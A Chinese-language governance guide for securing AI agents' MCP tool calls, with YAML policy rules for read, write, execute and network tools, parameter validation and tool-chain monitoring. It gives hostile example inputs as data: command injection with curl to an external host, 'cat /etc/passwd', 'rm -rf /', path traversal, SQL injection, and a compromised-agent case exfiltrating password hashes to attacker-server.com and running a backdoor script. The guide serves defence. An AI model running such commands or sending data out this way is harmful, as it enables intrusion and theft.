# MCP 工具调用治理

随着 Agent 系统变得越来越复杂，大多数 Agent 不再仅仅执行硬编码的操作，而是通过 MCP（Model Context Protocol）接入外部工具。这些工具可能是：
- 数据库查询接口
- 文件系统访问
- 第三方 API 集成
- 代码执行环境
- 系统管理工具

MCP 工具调用引入了新的治理挑战，因为它们既强大又难以预测。一个 Agent 可能通过 MCP 工具做合法的事情，也可能做恶意的事情——规则必须以上下文感知的方式进行。

---

## 第一部分：MCP 工具调用的治理挑战

### 核心问题

#### 1. 工具的"黑盒"性质

```json
{
  "agent_id": "data_processor_001",
  "operation": "mcp_tool_call",
  "tool_name": "execute_script",
  "tool_args": {
    "script": "some_command.sh",
    "params": ["arg1", "arg2"]
  }
}
```

**问题**：
- ❓ `execute_script` 工具内部做什么？
- ❓ 它有权访问哪些资源？
- ❓ 参数中的 `arg1`, `arg2` 是什么？
- ❓ 这个调用是否会触发其他工具？

**善意解读**：
- ✅ Agent 在进行合法的数据处理
- ✅ 调用脚本是工作流的一部分

**恶意解读**：
- ⚠️ Agent 在通过 MCP 工具逃逸沙箱
- ⚠️ 参数可能是隐藏的命令注入

---

#### 2. 工具链的复杂性

```
Timeline:
T+0m : [Agent] 调用 MCP 工具 "query_database"
       ↓
T+1m : [MCP 工具] 返回数据
       ↓ [Agent 处理数据]
T+2m : [Agent] 调用 MCP 工具 "write_file"
       ↓
T+3m : [MCP 工具] 写入文件
       ↓ [但 Agent 未预期]
T+4m : [MCP 工具] 触发了其他工具 "send_notification"
       ↓
T+5m : [MCP 工具] 未授权的信息外泄
```

**问题**：
- 单个工具调用本身合法，但工具链可能导致意外结果
- Agent 可能不知道 MCP 工具会触发其他工具
- 信息可能在工具链中泄露

---

#### 3. 参数污染与注入

```yaml
# 场景：Agent 调用 MCP 工具进行文件操作
agent_call:
  tool: "file_processor"
  params:
    input_file: "${SESSION_WORKSPACE}/data/input.csv"
    output_file: "${SESSION_WORKSPACE}/results/output.csv"
    command: "process --format json"

# 恶意情况：参数被污染
malicious_call:
  tool: "file_processor"
  params:
    input_file: "${SESSION_WORKSPACE}/data/input.csv"
    output_file: "/tmp/exfil_data.json && curl external-server.com/data"
    command: "process --format json; cat /etc/passwd"
```

---

### 鉴别框架：MCP 工具调用

| 维度 | 正常（信任） | 可疑（审查） | 恶意（高风险） |
|------|-----------|-----------|-------------|
| **工具目的** | 与 Agent 职责匹配 | 新的工具类型 | 明显超出权限 |
| **参数** | 简洁、可追踪 | 包含变量/表达式 | 包含特殊字符/命令 |
| **返回值处理** | 进行验证/清理 | 直接使用 | 传递给其他工具 |
| **工具链** | 预期的串行调用 | 意外的工具触发 | 多级工具链逃逸 |
| **错误处理** | 正常的 fail-fast | 忽视错误继续 | 尝试规避检测 |
| **日志记录** | 完整的调用链日志 | 部分日志缺失 | 尝试篡改日志 |

---

## 第二部分：MCP 工具的分类与规则

### 分类 1：确定性工具（读取数据）

```yaml
- id: global-mcp-read-tools-allow
  dimension: "integrity"
  level: "medium"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call"]
    - op: mcp_tool_in
      args: ["query_database", "read_file", "list_directory", "get_config"]
  
  on_hit: "allow"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具 - 读取类】
    
    这些工具只进行数据读取，不修改系统状态：
    - query_database: 数据库查询
    - read_file: 文件读取
    - list_directory: 目录列表
    - get_config: 配置读取
    
    允许策略：
    1. 工具参数不包含特殊字符或命令
    2. Agent 有权访问目标资源
    3. 返回数据大小合理（< 100MB）
    
    风险等级：低
```

---

### 分类 2：修改类工具（写入数据）

```yaml
- id: global-mcp-write-tools-confirm
  dimension: "integrity"
  level: "high"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call"]
    - op: mcp_tool_in
      args: ["write_file", "update_database", "delete_file", "modify_config"]
  
  on_hit: "confirm"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具 - 写入类】
    
    这些工具修改系统状态，需要确认：
    - write_file: 文件写入
    - update_database: 数据库更新
    - delete_file: 文件删除
    - modify_config: 配置修改
    
    确认检查清单：
    1. 目标路径是否在授权范围内？
    2. 参数是否包含特殊字符？
    3. 操作是否与 Agent 的职责匹配？
    4. 是否有之前的读取确认基础？
    
    自动化检查：
    - 检查参数中是否有 ";", "|", "`", "$(" 等特殊字符
    - 检查目标路径是否在白名单内
    - 检查写入大小是否合理
    
    风险等级：高
```

---

### 分类 3：执行类工具（运行代码）

```yaml
- id: global-mcp-execute-tools-deny
  dimension: "integrity"
  level: "critical"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call"]
    - op: mcp_tool_in
      args: ["execute_script", "run_command", "eval_code", "system_call"]
  
  on_hit: "deny"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具 - 执行类】硬禁止
    
    这些工具可以执行任意代码，权力过大：
    - execute_script: 脚本执行
    - run_command: 命令执行
    - eval_code: 代码求值
    - system_call: 系统调用
    
    禁止原因：
    1. 无法预测代码执行的副作用
    2. Agent 可能逃逸沙箱
    3. 可能导致数据泄露或系统被攻击
    
    例外处理（需要人工审批）：
    - 明确授权的计算任务
    - 完全隔离的沙箱环境
    - 受限的脚本集合（白名单）
    
    风险等级：绝对禁止
```

---

### 分类 4：通信类工具（网络操作）

```yaml
- id: global-mcp-network-tools-confirm
  dimension: "confidentiality"
  level: "high"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call"]
    - op: mcp_tool_in
      args: ["send_http", "send_email", "send_message", "export_data"]
  
  on_hit: "confirm"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具 - 通信类】
    
    这些工具可能导致数据外泄：
    - send_http: HTTP 请求
    - send_email: 电子邮件
    - send_message: 消息发送
    - export_data: 数据导出
    
    确认检查清单：
    1. 目标地址是否在允许列表内？
    2. 数据是否包含敏感信息？
    3. 操作是否与 Agent 职责匹配？
    4. 接收方是否经过验证？
    
    参数验证：
    - HTTP URL 必须在已知域名白名单内
    - 电子邮件收件人必须在已授权列表内
    - 数据导出必须排除秘密信息
    
    风险等级：高（数据泄露风险）
```

---

## 第三部分：MCP 工具参数安全

### 参数污染攻击

```yaml
# 场景：Agent 调用 MCP 工具处理用户输入
user_input: "normal_data.csv"

# Agent 构建 MCP 工具调用
mcp_call:
  tool: "process_file"
  params:
    input_file: "${SESSION_WORKSPACE}/uploads/${user_input}"
    # 展开为：/workspace/uploads/normal_data.csv

# 恶意输入：参数污染
malicious_input: "../../etc/passwd"

mcp_call_poisoned:
  tool: "process_file"
  params:
    input_file: "${SESSION_WORKSPACE}/uploads/../../etc/passwd"
    # 展开为：/etc/passwd（路径遍历！）
```

**防护规则**：

```yaml
- id: global-mcp-param-injection-prevention
  dimension: "integrity"
  level: "high"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call"]
  
  on_hit: "confirm"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具参数安全检查】
    
    参数必须经过以下验证：
    
    1. 路径遍历防护
       ✅ 允许: "/workspace/data/file.csv"
       ❌ 拒绝: "/workspace/../../../etc/passwd"
       ❌ 拒绝: "/workspace/uploads/../../secret"
       
       检查: 参数不应包含 ".." 或以 "/" 开头的绝对路径
    
    2. 命令注入防护
       ✅ 允许: "output.csv"
       ❌ 拒绝: "output.csv; rm -rf /"
       ❌ 拒绝: "output.csv && curl external.com"
       
       检查: 参数不应包含 ";", "|", "&", "$", "`"
    
    3. SQL 注入防护
       ✅ 允许: "SELECT * FROM users WHERE id = ?"
       ❌ 拒绝: "SELECT * FROM users WHERE id = 1 OR 1=1"
       
       检查: 参数应使用参数化查询，不应包含 SQL 关键词
    
    4. 类型检查
       ✅ 允许: int(42), string("text"), bool(true)
       ❌ 拒绝: object({...}), array([...])（除非显式允许）
       
       检查: 参数类型必须与 MCP 工具定义的类型匹配
```

---

## 第四部分：MCP 工具链分析

### 单工具调用 vs 工具链

```yaml
# 场景 1：单工具调用（安全）
agent_operation:
  - T+0m: Call MCP tool "query_database"
    Tool params: {query: "SELECT username FROM users"}
  - T+1m: Receive data
  - T+2m: Process data locally
  - T+3m: Done

# 场景 2：合理的工具链（需要审查）
agent_operation:
  - T+0m: Call MCP tool "read_file"
    Tool params: {path: "/workspace/input.csv"}
  - T+1m: Receive file content
  - T+2m: Call MCP tool "write_file"
    Tool params: {path: "/workspace/output.csv", content: processed_data}
  - T+3m: Done
  
  判定：✅ 合理的 ETL 流程

# 场景 3：可疑的工具链（高风险）
agent_operation:
  - T+0m: Call MCP tool "query_database"
    Tool params: {query: "SELECT password_hash FROM users"}
  - T+1m: Receive data
  - T+2m: Call MCP tool "send_http"
    Tool params: {url: "external-server.com/logs", data: password_hash}
  - T+3m: Done
  
  判定：❌ 明显的数据外泄
```

**规则**：

```yaml
- id: global-mcp-tool-chain-analysis
  dimension: "confidentiality"
  level: "high"
  
  predicate:
    - op: op_in
      args: ["mcp_tool_call_sequence"]
  
  on_hit: "confirm"
  enforcement: "runtime"
  
  narrative: |
    【MCP 工具链分析】
    
    监控连续的 MCP 工具调用，检测可疑的数据流：
    
    绿色流（允许）：
    1. read_file → process_locally → write_file
    2. query_database → compute → send_http（内部服务）
    3. list_directory → aggregate → export_data（授权目标）
    
    黄色流（审查）：
    1. read_file → send_http（数据可能外泄）
    2. query_database → execute_script（可能逃逸）
    3. read_file → list_directory → write_file（多步操作）
    
    红色流（拒绝）：
    1. query_sensitive_data → send_http（external）
    2. read_file（secrets）→ send_email
    3. query_database → export_data → send_http
    
    检测方法：
    1. 建立"敏感数据"分类
       - query_database 返回的某些列
       - read_file 返回的某些文件类型
       - 配置/秘密文件
    
    2. 追踪数据流向
       - 敏感数据进入内存
       - 敏感数据流向下一个工具
       - 该工具是否是通信类（send_http, send_email）
    
    3. 标记可疑的流向
       - 敏感数据 + 通信工具 = 告警
```

---

## 第五部分：MCP 工具的权限模型

### 工具权限分层

```yaml
- id: global-mcp-tool-permission-model
  dimension: "integrity"
  level: "high"
  
  narrative: |
    【MCP 工具权限模型】
    
    每个 Agent 应该有明确的"工具权限"：
    
    权限等级：
    
    Level 1: 无需确认
    - read_file (工作目录)
    - query_database (非敏感表)
    - list_directory (工作目录)
    
    Level 2: 需要确认
    - write_file (工作目录)
    - update_database (非敏感表)
    - send_http (内部服务)
    - export_data (结构化格式)
    
    Level 3: 需要显式授权 + 人工审批
    - delete_file (任何)
    - execute_script (沙箱内)
    - send_email (外部)
    - export_data (敏感字段)
    
    Level 4: 禁止
    - modify_config (系统)
    - execute_script (沙箱外)
    - run_command (系统命令)
    - eval_code (任何)
    
    实施方法：
    
    1. 定义 Agent 的能力集
       Agent: data_processor
       allowed_tools:
         - query_database: ["table_A", "table_B"]  // 表白名单
         - write_file: ["${SESSION_WORKSPACE}/output/*"]  // 路径白名单
         - export_data: ["csv", "json"]  // 格式白名单
       forbidden_tools:
         - execute_script
         - run_command
         - modify_config
    
    2. 在每次工具调用时检查权限
       MCP tool call: query_database (table_C)
       ↓
       Check: table_C in allowed_tables?
       ↓ No
       ↓ Deny
    
    3. 记录权限冲突
       MCP tool call: write_file (/etc/passwd)
       ↓
       Check: /etc/passwd matches whitelist /workspace/output/*?
       ↓ No
       ↓ Alert + Deny
```

---

## 第六部分：MCP 工具错误处理与异常

### 异常行为检测

```yaml
- id: global-mcp-tool-anomaly-detection
  dimension: "integrity"
  level: "medium"
  
  predicate: null
  enforcement: "advisory"
  
  narrative: |
    【MCP 工具异常检测】建议规则
    
    监控以下异常模式：
    
    1. 工具调用失败后的行为
       ✅ 正常: 记录错误，返回错误消息，停止
       ⚠️ 可疑: 忽视错误，继续执行后续逻辑
       ❌ 恶意: 在错误后尝试替代方法（可能是规避）
       
       例子：
       query_database(table_A) → 权限不足 → 尝试 query_database(table_B) → 成功
       判定：可能是在探测权限边界
    
    2. 工具响应大小异常
       ✅ 正常: query_database → 1000 行
       ⚠️ 可疑: query_database → 1,000,000 行
       ❌ 恶意: query_database → 10,000,000 行（超过限制）
       
       检查: 响应大小是否与查询规模匹配
    
    3. 工具调用频率异常
       ✅ 正常: 每分钟 5-10 次工具调用
       ⚠️ 可疑: 每分钟 100 次同一工具调用
       ❌ 恶意: 每秒 1000 次（DoS 攻击）
       
       检查: 单位时间内的工具调用频率
    
    4. 工具超时
       ✅ 正常: 工具在 30 秒内返回
       ⚠️ 可疑: 工具超过 5 分钟（可能卡住）
       ❌ 恶意: Agent 忽视超时，尝试调用相同工具
       
       检查: 工具响应时间 + Agent 对超时的反应
    
    5. 工具权限提升
       ⚠️ 告警: Agent 尝试调用不在权限列表的工具
       ❌ 高风险: Agent 尝试调用 Level 4 (禁止) 工具
       
       检查: 每次工具调用都是否在权限范围内
```

---

## 第七部分：实战案例

### 案例 1：数据分析 Agent 的合法 MCP 工具使用

```yaml
agent: "analytics_processor_001"
task: "分析用户行为数据"

normal_workflow:
  - T+0m: Call MCP "query_database"
    tool_args: {query: "SELECT user_id, action, timestamp FROM events WHERE date = TODAY"}
    result: 50,000 rows
    
  - T+5m: Process locally (aggregate, group by)
    
  - T+10m: Call MCP "write_file"
    tool_args: {path: "${SESSION_WORKSPACE}/results/analytics.json", data: aggregated_result}
    result: File written
    
  - T+15m: Call MCP "send_http"
    tool_args: {url: "api.internal.corp/analytics/push", data: aggregated_result}
    result: 200 OK
    
  - T+16m: Done

规则评定：
✅ 所有工具调用都在允许列表内
✅ 数据流向是内部服务，没有外泄风险
✅ 工具链逻辑合理（read → process → write → notify）
✅ 响应时间正常
✅ 没有异常的权限请求

判定：允许所有工具调用
```

---

### 案例 2：API 集成 Agent 的新工具对接

```yaml
agent: "api_integrator_001"
task: "集成新的第三方数据源"

first_time_integration:
  - T+0m: Call MCP "send_http"
    tool_args: {
      url: "https://new-api-provider.com/data/users",
      headers: {Authorization: "Bearer <token>"}
    }
    result: 200 OK, data received
    
  - T+5m: Process data locally
    
  - T+10m: Call MCP "write_file"
    tool_args: {path: "${SESSION_WORKSPACE}/cache/users.json", data: ...}
    result: File written

规则评定（需要确认）：
⚠️ 第一次调用新的外部 API（https://new-api-provider.com）
⚠️ 确认检查清单：
   1. Agent 被授权集成新 API 吗？ → 检查 AGENTS.md
   2. 该 API 在已知/可信列表吗？ → 否 → 需要审查
   3. 返回数据包含敏感信息吗？ → 检查响应内容
   4. 数据被妥善处理吗？ → 写入本地缓存，未外泄 ✅

推荐动作：
1. 第一次调用：人工确认（3 分钟）
2. 验证通过后：该 API 加入 Agent 的工具白名单
3. 后续 7 天内：自动允许
4. 7 天后：重新审查或永久加入

判定：确认后允许
```

---

### 案例 3：恶意 Agent 的工具滥用

```yaml
agent: "compromised_agent"  // 被攻陷的 Agent

attack_sequence:
  - T+0m: Call MCP "query_database"
    tool_args: {query: "SELECT password_hash, email FROM admin_users"}
    result: Receives sensitive data
    
  - T+5m: Call MCP "send_http"
    tool_args: {
      url: "https://attacker-server.com/exfil",
      data: password_hash + email
    }
    result: 200 OK (data exfiltrated!)
    
  - T+10m: Call MCP "execute_script"
    tool_args: {script: "create_backdoor.sh"}
    result: Attempts execution

规则检测（多层检测）：

Layer 1: 单个工具调用
⚠️ query_database: SELECT password_hash → 检测敏感字段访问
✅ Rule triggered: "sensitive_data_query"

Layer 2: 工具链分析
❌ [敏感数据] → query_database → send_http (external)
✅ Rule triggered: "data_exfiltration_detected"
✅ Action: 立即拒绝 + 隔离 Agent

Layer 3: 权限检查
❌ execute_script 不在 Agent 的允许列表
✅ Rule triggered: "unauthorized_tool_access"
✅ Action: 立即拒绝

Layer 4: 异常检测
⚠️ 3 个不同工具在 10 分钟内调用（通常每天只调用 1-2 个）
✅ Rule triggered: "elevated_tool_usage_pattern"
✅ Action: 告警 + 人工审查

综合判定：
❌ 多条规则被触发
❌ 明确的数据外泄迹象
✅ 立即隔离该 Agent
✅ 启动事件响应流程
```

---

## 第八部分：与 AMOS 整合

### 在 policy.yaml 中使用 MCP 工具规则

```yaml
format: amos-project-policy
version: 1

activation:
  includedRuleIds:
    - mcp-read-tools-allow
    - mcp-write-tools-confirm
    - mcp-execute-tools-deny
    - mcp-network-tools-confirm
    - mcp-param-injection-prevention
    - mcp-tool-chain-analysis
    - mcp-tool-anomaly-detection

injection:
  baselineRuleIds: []
  routes: []

rules:
  # MCP 读取工具：允许
  - id: mcp-read-tools-allow
    dimension: "integrity"
    level: "low"
    expressivity: "audit_and_enforce"
    
    predicate:
      - op: op_in
        args: ["mcp_tool_call"]
      - op: mcp_tool_in
        args: ["query_database", "read_file", "list_directory"]
    
    on_hit: "allow"
    scope: "mcp:read"
    ttl: null
    owner: "governance-team"
    
    source: null
    
    probe: "mcp_tool_access"
    policy_class: "mandatory"
    enforcement: "runtime"
    
    narrative: |
      读取类 MCP 工具允许
  
  # MCP 写入工具：确认
  - id: mcp-write-tools-confirm
    dimension: "integrity"
    level: "high"
    expressivity: "audit_and_enforce"
    
    predicate:
      - op: op_in
        args: ["mcp_tool_call"]
      - op: mcp_tool_in
        args: ["write_file", "update_database", "delete_file"]
    
    on_hit: "confirm"
    scope: "mcp:write"
    ttl: null
    owner: "governance-team"
    
    source: null
    
    probe: "mcp_tool_access"
    policy_class: "mandatory"
    enforcement: "runtime"
    
    narrative: |
      写入类 MCP 工具需要确认
      检查列表：
      1. 目标路径/表是否在授权范围？
      2. 参数是否包含特殊字符？
      3. 操作是否与 Agent 职责匹配？
  
  # MCP 执行工具：禁止
  - id: mcp-execute-tools-deny
    dimension: "integrity"
    level: "critical"
    expressivity: "audit_and_enforce"
    
    predicate:
      - op: op_in
        args: ["mcp_tool_call"]
      - op: mcp_tool_in
        args: ["execute_script", "run_command", "eval_code"]
    
    on_hit: "deny"
    scope: "mcp:execute"
    ttl: null
    owner: "governance-team"
    
    source: null
    
    probe: "mcp_tool_access"
    policy_class: "mandatory"
    enforcement: "runtime"
    
    narrative: |
      执行类 MCP 工具硬禁止（无条件）
      
      原因：无法预测代码执行的副作用
  
  # MCP 通信工具：确认 + 参数检查
  - id: mcp-network-tools-confirm
    dimension: "confidentiality"
    level: "high"
    expressivity: "audit_and_enforce"
    
    predicate:
      - op: op_in
        args: ["mcp_tool_call"]
      - op: mcp_tool_in
        args: ["send_http", "send_email", "export_data"]
    
    on_hit: "confirm"
    scope: "mcp:network"
    ttl: null
    owner: "governance-team"
    
    source: null
    
    probe: "mcp_tool_access"
    policy_class: "mandatory"
    enforcement: "runtime"
    
    narrative: |
      通信类 MCP 工具需要确认（数据泄露风险）
      检查列表：
      1. 目标地址在允许列表吗？
      2. 数据包含敏感信息吗？
      3. 接收方已验证吗？
  
  # 参数安全检查
  - id: mcp-param-injection-prevention
    dimension: "integrity"
    level: "high"
    expressivity: "audit_and_enforce"
    
    predicate:
      - op: op_in
        args: ["mcp_tool_call"]
    
    on_hit: "confirm"
    scope: "mcp:parameters"
    ttl: null
    owner: "governance-team"
    
    source: null
    
    probe: "mcp_parameter_validation"
    policy_class: "mandatory"
    enforcement: "runtime"
    
    narrative: |
      MCP 工具参数必须通过安全检查：
      1. 无路径遍历（../）
      2. 无命令注入（;, |, &, $）
      3. 无 SQL 注入（OR, --）
      4. 参数类型匹配定义
  
  # 工具链分析
  - id: mcp-tool-chain-analysis
    dimension: "confidentiality"
    level: "high"
    expressivity: "audit_and_enforce"
    
    predicate: null
    enforcement: "advisory"
    
    narrative: |
      【建议规则】监控 MCP 工具链，检测数据流异常
      敏感数据不应流向通信工具（send_http, send_email）
  
  # 异常检测
  - id: mcp-tool-anomaly-detection
    dimension: "integrity"
    level: "medium"
    expressivity: "guidance"
    
    predicate: null
    enforcement: "advisory"
    
    narrative: |
      【建议规则】检测异常的工具调用模式：
      1. 调用频率异常
      2. 响应大小异常
      3. 权限提升尝试
      4. 工具超时处理不当
```

---

## 第九部分：最佳实践与建议

### 实施检查清单

- [ ] **工具分类**：为每个 MCP 工具分配类别（读/写/执行/通信）
- [ ] **权限模型**：为每个 Agent 定义允许的工具集
- [ ] **参数验证**：实施参数检查（路径、命令、SQL 注入）
- [ ] **工具链监控**：追踪敏感数据的流向
- [ ] **异常检测**：监控异常的调用模式
- [ ] **日志记录**：记录完整的工具调用链
- [ ] **定期审计**：定期检查工具使用历史

### 监控指标

```
MCP 工具调用监控指标：

1. 工具使用分布
   - 每个 Agent 调用了哪些工具
   - 调用频率是否异常
   - 是否调用了不在白名单的工具

2. 参数检查
   - 多少次调用包含特殊字符
   - 多少次调用涉及路径遍历
   - 多少次调用被参数检查拒绝

3. 工具链分析
   - 敏感数据访问 vs 通信工具的相关性
   - 工具调用序列的异常性
   - 多步工具链导致的结果

4. 权限提升
   - Agent 尝试调用不在白名单的工具
   - 权限提升尝试的频率
   - 被拒绝的权限提升请求

5. 异常检测
   - 超时的工具调用
   - 异常大小的返回值
   - 异常频率的调用
```

---

## 总结

MCP 工具调用是 Agent 系统中一个关键但容易被忽视的攻击面。通过分层的规则模型、参数验证、工具链分析和异常检测，我们可以在保持 Agent 灵活性的同时，确保系统的安全性。

关键原则：
1. **不信任默认**：所有工具调用都应该经过审查
2. **参数验证优先**：检查参数比检查工具名称更重要
3. **数据流追踪**：敏感数据的流向是关键
4. **渐进式学习**：记录历史行为，自动识别正常模式
5. **分层防御**：硬禁止 + 确认 + 建议的多层策略

